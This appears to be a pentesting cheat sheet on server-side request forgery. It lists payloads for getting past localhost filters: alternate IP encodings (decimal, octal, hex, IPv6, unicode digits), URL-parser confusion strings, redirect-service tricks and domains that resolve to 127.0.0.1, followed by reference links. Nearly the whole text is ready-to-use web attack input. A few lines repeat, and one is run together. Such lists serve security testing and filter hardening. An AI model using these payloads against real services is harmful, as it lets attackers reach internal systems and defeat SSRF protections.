# SSRF

## Basics

```
protocol://username:password@host:port/path?query#fragment
```

## Localhost Bypass

```
127.0.0.1:80
127.0.0.1:443
127.0.0.1:22
127.1:80
0
0.0.0.0:80
localhost:80
[::]:80/
[::]:25/ SMTP
[::]:3128/ Squid
[0000::1]:80/
[0:0:0:0:0:ffff:127.0.0.1]/thefile
①②⑦.⓪.⓪.⓪
127.127.127.127
127.0.1.3
127.0.0.0
2130706433/
017700000001
3232235521/
3232235777/
0x7f000001/
0xc0a80014/
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@localhost
localhost#{domain}
{domain}.localhost
localhost/{domain}
localhost/?d={domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}st:+11211aaa
st:00011211aaaa
0/
127.1
127.0.1
1.1.1.1 &@2.2.2.2# @3.3.3.3/
127.1.1.1:80\@127.2.2.2:80/
127.1.1.1:80\@@127.2.2.2:80/
127.1.1.1:80:\@@127.2.2.2:80/
127.1.1.1:80#\@127.2.2.2:80/

```

## Redirect Bypass

```url
https://307.r3dir.me/--to/?url=http://localhost

https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me
```

## URL Parse Bypass <a href="#url-parse-bypass" id="url-parse-bypass"></a>

```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

## Bypass Localhost with Domain Redirect

| Domain                        | Redirect To |
| ----------------------------- | ----------- |
| localtest.me                  | `::1`       |
| localh.st                     | `127.0.0.1` |
| spoofed.\[BURP\_COLLABORATOR] | `127.0.0.1` |
| spoofed.redacted.oastify.com  | `127.0.0.1` |
| company.127.0.0.1.nip.io      | `127.0.0.1` |

## Useful Links

* [https://highon.coffee/blog/ssrf-cheat-sheet/](https://highon.coffee/blog/ssrf-cheat-sheet/)
* [https://hacktricks.boitatech.com.br/pentesting-web/ssrf-server-side-request-forgery](https://hacktricks.boitatech.com.br/pentesting-web/ssrf-server-side-request-forgery)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
* [https://github.com/whatwg/url/issues/626  ](https://github.com/whatwg/url/issues/626)
* [https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf  <br>](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)[<br>](https://github.com/whatwg/url/issues/626)
